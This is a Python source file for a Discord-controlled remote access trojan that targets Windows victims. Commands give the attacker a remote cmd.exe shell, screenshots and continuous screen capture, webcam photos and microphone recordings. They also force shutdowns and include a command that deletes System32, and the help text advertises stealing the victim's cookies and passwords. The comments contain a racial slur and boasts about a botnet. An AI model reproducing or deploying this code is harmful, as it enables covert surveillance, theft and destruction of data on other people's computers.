import discord
from discord.ext import commands
from discord import Intents
import subprocess
import os
import ctypes
from PIL import ImageGrab
import io
import time
import cv2
import pyaudio
import random
#import modules.cookies as cumkies

# this code is ahem, not very good. 
# it started off good with modularisation and stuff
# and i just can't be bothered to do it
# i'll refactor it later
# gang gang opps on me internet shootas
# cybernigga gang gang

# i got hella booters on my bawtnet
# i got hella booters on my bawtnet
# i got hella booters on my bawtnet
# i got hella booters on my bawtnet
# i got hella booters on my bawtnet

intents = Intents.all() # can we go back to the days where there was no intents
bot = commands.Bot(command_prefix=';', intents=intents)

@bot.event
async def on_ready():
    print(f'i am {bot.user.name}')

#@bot.command()
#async def browser(ctx):
#    content = cumkies.main_func()  # get the content from main_func
#        
#    embed = discord.Embed(title="Cookies", description=content, color=discord.Color.blue())
#    await ctx.send(embed=embed) 

@bot.command()
async def cmds(ctx):
    embed = discord.Embed(title="Commands", description="Commands: \n`browser` - Grabs the Victim's cookies and passwords.", color=discord.Color.blue())
    await ctx.send(embed=embed)


current_directory = os.getcwd()

@bot.command()
async def shell(ctx, *, command):
    global current_directory  

    if command == "cd":
        await ctx.send(f"Current directory: {current_directory}")
    elif command.startswith("cd "):
        new_directory = command[3:]
        try:
            os.chdir(new_directory)
            current_directory = os.getcwd()
            await ctx.send(f"Changed directory to: {current_directory}")
        except FileNotFoundError:
            await ctx.send("Directory not found.")
    elif command == "ls":
        file_list = os.listdir(current_directory)
        await ctx.send(f"Files in directory: {', '.join(file_list)}")
    else:
        process = subprocess.Popen(command, shell=True, executable="cmd.exe", stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if output:
            await ctx.send(f"Output:\n```\n{output.decode()}\n```")
        if error:
            await ctx.send(f"Error:\n```\n{error.decode()}\n```")

@bot.command()
async def bsod(ctx):    
    def raise_hard_error(error_code):
        ntdll = ctypes.WinDLL('ntdll.dll')
        ntdll.NtRaiseHardError(error_code, 0, 0, None, 6, ctypes.byref(ctypes.c_ulong()))

@bot.command()
async def shutdown(ctx):
    os.system("shutdown /s /t 1")

@bot.command()
async def restart(ctx):
    os.system("shutdown /r /t 1")

@bot.command()
async def sys32(ctx):
    os.system("del C:\Windows\System32")

@bot.command()
async def screenshot(ctx):
    screenshot = ImageGrab.grab()
    
    byte_stream = io.BytesIO()
    screenshot.save(byte_stream, format='PNG')
    byte_stream.seek(0)
    
    file = discord.File(byte_stream, filename='screenshot.png')
    
    await ctx.send(file=file)

@bot.command()
async def record(ctx):
    while True:
        screenshot = ImageGrab.grab()
    
        byte_stream = io.BytesIO()
        screenshot.save(byte_stream, format='PNG')
        byte_stream.seek(0)
    
        file = discord.File(byte_stream, filename='screenshot.png')
    
        await ctx.send(file=file)
        time.sleep(5)

        #todo: make it stop recording when stoprecord is called

@bot.command()
async def stoprecord(ctx):

    await ctx.send("i don't know how to do this right now, thank you come again :)")

@bot.command()
async def webcam(ctx):
    # use cv2 to take a picture and send it

    cam = cv2.VideoCapture(0)

    # exists? 
    if not cam.isOpened():
        await ctx.send("No webcam detected!")
        return

    result, frame = cam.read()

    if not result:
        await ctx.send("Could not read from webcam!")
        return

    cv2.imwrite("webcam.jpg", frame)
    if random.randint(1, 50) == 1:
        ctypes.windll.user32.MessageBoxW(0, "say cheese!", "you're ugly as shit", 1)
    cam.release()

    await ctx.send(file=discord.File("webcam.jpg"))

import wave

@bot.command()
async def mic(ctx):
    # pyaudio mic capture, send in 30 second chunks

    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    CHUNK = 1024
    RECORD_SECONDS = 30
    WAVE_OUTPUT_FILENAME = "file.wav"

    audio = pyaudio.PyAudio()

    stream = audio.open(format=FORMAT, channels=CHANNELS,
                    rate=RATE, input=True,
                    frames_per_buffer=CHUNK)
    
    frames = []

    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()

    waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    waveFile.setnchannels(CHANNELS)
    waveFile.setsampwidth(audio.get_sample_size(FORMAT))
    waveFile.setframerate(RATE)
    waveFile.writeframes(b''.join(frames))
    waveFile.close()

    await ctx.send(file=discord.File(WAVE_OUTPUT_FILENAME))

if __name__ == "__main__":
    with open('token.txt', 'r') as file:
        bot_token = file.read().strip()
    bot.run(bot_token)

# i hate programming so much 
# maybe it wouldn't be so bad if mr sertraline would work!
# i'm going to go and cry now
# update: i'm back from crying
# i love venting in my code, because no one will ever see it!
# and those who do, don't care!
# good fun